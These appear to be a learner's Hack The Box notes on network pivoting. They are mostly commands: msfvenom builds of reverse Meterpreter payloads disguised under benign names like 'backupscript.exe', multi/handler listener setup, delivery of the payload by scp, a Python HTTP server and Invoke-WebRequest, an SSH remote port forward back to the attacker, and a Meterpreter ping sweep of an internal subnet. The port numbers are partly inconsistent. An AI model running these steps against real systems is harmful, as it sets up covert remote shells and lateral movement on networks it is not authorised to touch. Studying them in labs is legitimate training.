One is able to install a backdoor or a reverse shell on the off network system with the help of port forwarding.

First one will need to set up a payload.
```bash
user@htb$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

# Launch the handler
msf6 > use exploit/multi/handler

# Copy the file to the machine
user@htb$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

# Back to the pivot host
ubuntu@Webserver$ python3 -m http.server 8123

# Downloading via the Windows host
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

Once we have our payload downloaded on the Windows host, we will use `SSH remote port forwarding` to forward connections from the Ubuntu server's port 8080 to our msfconsole's listener service on port 8000. We will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell. The `-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.
`ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN`

### Exercise
Going onto the Ubuntu, running `ip route` gave the ip of `172.16.5.129`

# Meterpreter Tunneling & Port Forwarding
Creating the payload for Ubuntu pivot Host
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

# Then configuring the handler
msf6 > use exploit/multi/handler [*] Using configured payload
generic/shell_reverse_tcp msf6 exploit(multi/handler) > set lhost 0.0.0.0 lhost => 0.0.0.0 msf6 exploit(multi/handler) > set lport 8080 lport => 8080 msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp payload => linux/x64/meterpreter/reverse_tcp msf6 exploit(multi/handler) > run [*] Started reverse TCP handler on 0.0.0.0:8080
```

Then doing a simple chmod the file then running `./` 
While on the ubuntu server one will have the meterpreter.
`meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`